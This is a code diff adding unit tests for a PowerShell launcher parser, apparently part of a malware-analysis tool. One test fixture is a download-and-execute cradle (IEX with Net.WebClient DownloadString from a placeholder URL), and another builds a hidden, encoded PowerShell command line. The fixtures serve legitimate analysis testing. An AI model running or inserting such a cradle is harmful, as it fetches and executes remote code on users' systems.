@@ -145,3 +145,23 @@ describe('parseLauncher', () => {
     expect(describeLauncher(parseLauncher('powershell "a ^| b"'))).toContain('cmd.exe escaping');
   });
 });
+
+describe('what the engine is handed', () => {
+  // The engine worker runs parseLauncher(source).script rather than the source.
+  // Handing it the raw command line runs `powershell` as a PowerShell command,
+  // which it is not, so nothing executes and the whole analysis comes back
+  // empty - and `powershell -enc ...` is the single most common shape a real
+  // sample arrives in. The product's own example is one.
+  it('yields the decoded payload for an -enc command line', () => {
+    const encoded = Buffer.from("Write-Host 'hi'", 'utf16le').toString('base64');
+    const parse = parseLauncher(`powershell -nop -w hidden -enc ${encoded}`);
+    expect(parse.isLauncher).toBe(true);
+    expect(parse.script).toBe("Write-Host 'hi'");
+  });
+
+  it('yields the input unchanged when it is already a script', () => {
+    // The worker runs this unconditionally, so a plain script must survive it.
+    const script = "IEX ((New-Object Net.WebClient).DownloadString('http://x/y'))";
+    expect(parseLauncher(script).script).toBe(script);
+  });
+});
